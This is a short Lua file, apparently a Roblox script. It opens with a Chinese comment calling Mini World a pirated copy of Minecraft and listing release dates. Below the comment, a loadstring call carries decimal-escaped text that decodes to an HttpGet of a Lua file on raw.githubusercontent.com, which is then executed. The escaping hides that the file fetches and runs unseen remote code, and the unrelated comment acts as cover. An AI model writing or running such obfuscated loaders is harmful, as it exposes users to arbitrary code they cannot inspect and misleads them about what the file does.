--[[
迷你世界是盗版。§1 发行日期《我的世界》是由瑞典游戏设计师马库斯·阿列克谢·泊松(Markus Alexej Persson，即Notch）用Java语言开发的沙盒游戏，于2009年公开alpha版本（测试版）。随后由瑞典公司“Mojang”2011年11月正式发布，并变为延斯·伯根斯坦（Jens Bergensten(Jeb)) 负责主要游戏开发。根据一些早期玩家的回忆，MC进入中国可能就是2011年年末，然后在2016年5月，网易宣布代理《我的世界》中国版，2017年8月开启公测。迷你世界：……开发商 深圳市迷你玩科技有限公司发行公司 北京科学技术出版社有限公司发行日期 2015年12月
]]
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\119\117\97\116\104\101\104\97\100\47\117\119\117\47\109\97\105\110\47\88\105\97\111\89\117\110\119\104\105\116\101\108\105\115\116\46\108\117\97\34\41\41\40\41\10")()
